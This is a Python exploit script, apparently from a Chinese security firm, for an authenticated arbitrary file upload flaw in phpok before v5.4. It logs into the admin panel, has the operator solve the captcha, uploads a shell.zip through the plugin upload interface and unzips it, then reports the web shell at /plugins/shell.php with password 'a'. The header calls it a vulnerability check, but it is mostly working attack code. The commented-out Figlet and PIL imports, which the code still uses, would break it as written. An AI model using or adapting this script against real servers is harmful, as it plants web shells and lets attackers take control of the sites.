#!/usr/bin/env python3
#
# Single check to see if the server is still vulnerable to CVE-2020-01241
# Written by: 秋水
# Company: 泽鹿安全
#
# from pyfiglet import Figlet
# from PIL import Image
import time
import requests
import datetime
import optparse

code = 'CVE-2020-01241'
version = '1.0'
author = '秋水'
vulDate = '2020-03-19'
createDate = '2020-03-19'
updateDate = '2020-03-19'
name = 'phpok v5.4任意文件上传漏洞 (CVE-2020-01241)'
appPowerLink = 'www.phpok.com'
appName = 'phpok'
appVersion = '版本小于 phpok v5.4'
way = 'python CNVD-2020-01241.py -l http://127.0.0.1 -u admin -p 123456'


# 打印当前时间
def nowtime():
    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    return now


# 程序结束
def endtime():
    print(" ")
    time.sleep(0.3)
    print("*] shutting down at %s" % datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))


# 输出基本信息
def output():
    f = Figlet(font='slant')  # 斜体 不slant是默认的字体 是不倾斜的
    code1 = f.renderText(code)
    print(" ")
    print(code1)  # 里面写需要的生成的文字，只支持英文
    print(" ")
    time.sleep(0.3)
    print("[*] 漏洞名称：%s" % name)
    time.sleep(0.3)
    print("[*] 影响版本：%s" % appVersion)
    time.sleep(0.3)
    print("[*] 使用方式：%s" % way)
    time.sleep(0.3)
    print("[*] 脚本版本：%s" % version)
    time.sleep(0.3)
    print("[*] 更新日期：%s" % updateDate)
    time.sleep(0.3)
    print("  ")
    print('''***********************************
           开始检测漏洞
***********************************''')
    print("  ")


header = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Connection": "close"
}


# 登录模块.
def verify():
    path = "/admin.php?c=login&f=ok"
    url1 = url + "/api.php?c=vcode&id=admin&_noCache=0.34845168731419074"
    session = requests.session()
    try:
        r = session.get(url1)

        if r.status_code == 200:
            print("[*] %s 正在生成验证码，请稍后..." % nowtime())
            with open("code.png", "wb") as f:
                f.write(r.content)
            f.close()
            img = Image.open("code.png")
            img.show()
            _code = input("[*] %s 请输出弹出的验证码，并按回车键：" % nowtime())
            address = url + path

            # While循环，如果验证码输错，可重复输入，无需再次运行程序
            while True:
                data = {
                    "user": "%s" % user,
                    "pass": "%s" % passwd,
                    "_code": "%s" % _code
                }

                # 尝试登录
                resp = session.post(address, headers=header, data=data)
                if "管理员密码输入不正确" in str(resp.text):
                    print("[-] 密码输入不正确！")
                    endtime()
                    break
                elif "验证码填写不正确" in str(resp.text):
                    _code1 = input("[-] 验证码输入不正确！是否重新输入（Y/N）：")
                    if _code1 == "Y" or _code1 == "y":
                        _code = input("[*] %s 请再次输入验证码：" % nowtime())
                        continue
                    elif _code1 == "N" or _code1 == "n":
                        endtime()
                        break
                    else:
                        endtime()
                        break
                elif "管理员账号不能为空" in str(resp.text):
                    print("[-] 账号不能为空！")
                    endtime()
                    break
                elif "密码不能为空" in str(resp.text):
                    print("[-] 密码不能为空！")
                    endtime()
                    break
                elif "您已成功登录，无需再次验证" in str(resp.text):
                    print("[-] 请勿重复登陆！")
                    endtime()
                    break
                elif "登录成功" in str(resp.text):
                    time.sleep(0.3)
                    print("[+] 登陆成功！")

                    # 尝试访问插件页面，访问成功则证明登录生效
                    address1 = url + "/admin.php?c=plugin&menu_id=16"
                    resp1 = session.get(address1)
                    if resp1.status_code == 200:
                        time.sleep(0.3)
                        print("[*] %s 跳转插件中心..." % nowtime())
                        time.sleep(0.3)
                        print("[+] 跳转成功！")
                        path1 = "/admin.php?c=upload&f=zip&name=shell.zip"

                        # 上传所用的接口
                        address2 = url + path1
                        time.sleep(0.3)
                        print("[*] %s 寻找上传接口..." % nowtime())

                        # 读取shell文件
                        try:
                            time.sleep(0.3)
                            print("[*] %s 开始读取文件..." % nowtime())
                            with open("shell.zip", "rb") as s:
                                data1 = s.read()
                            s.close()
                        except FileNotFoundError:
                            time.sleep(0.3)
                            print("[-] 未发现相关文件，请检查shell文件是否存在与当前目录")
                            endtime()
                            break

                        # 开始上传到缓存目录
                        time.sleep(0.3)
                        print("[*] %s 开始上传文件..." % nowtime())
                        resp2 = session.post(address2, data=data1, headers=header)
                        if resp2.status_code == 200 and str(resp2.json()['status']) == "ok":
                            time.sleep(0.3)
                            print("[+] 文件上传成功！")
                            text = resp2.json()
                            try:
                                content = text['content']
                            except KeyError as e:
                                time.sleep(0.3)
                                print("[-] 键名错误或不存在!"+"\n"+e)
                            time.sleep(0.3)

                            # 解压文件
                            print("[*] %s 开始解压shell文件..." % nowtime())
                            address3 = url + "/admin.php?c=plugin&f=unzip&filename=%s" % str(content)
                            resp3 = session.get(address3)
                            address4 = url + "/plugins/shell.php"
                            resp4 = session.get(address4)
                            if resp3.status_code == 200 and resp4.status_code == 200:
                                time.sleep(0.3)
                                print("[+] shell文件解压成功！")
                                time.sleep(0.3)
                                print("[+] shell地址为：%s" % address4)
                                time.sleep(0.3)
                                print("[+] shell密码为：a")
                                endtime()
                            else:
                                print("[-] 文件上传失败！请检查当前目录是否存在shell文件")
                                endtime()
                        else:
                            print("[-] 上传失败！")
                            endtime()
                    elif resp1.status_code == 302:
                        time.sleep(0.3)
                        print("[-] 会话已过期，请重新登录！")
                    else:
                        time.sleep(0.3)
                        print("[-] 目标网站无法访问")
                        endtime()
                    break
                else:
                    print("[-] 登录失败！")
                    break
        else:
            print("[-] 目标网站无法访问")
            endtime()

    except requests.exceptions.ConnectionError:
        print("[-] 目标网站无法访问")
        endtime()
    except requests.exceptions.MissingSchema:
        print("[-] 目标网站格式不合法")
        endtime()


if __name__ == "__main__":
    usage = "python %prog -l/-L <target url> -u/-U <target username> -p/-P <target password>"  # 用于显示帮助信息
    parser = optparse.OptionParser(usage)  # 创建对象实例
    parser.add_option('-l', '-L', dest='url', type='string', help='target url',
                      default="http://192.168.31.106/test/phpok")  # 需要的命令行参数
    parser.add_option('-u', '-U', dest='user', type='string', help='username', default='admin')
    parser.add_option('-p', '-P', dest='passwd', type='string', help='passwd', default='123456')
    (options, args) = parser.parse_args()
    url = options.url
    user = options.user
    passwd = options.passwd
    output()
    verify()
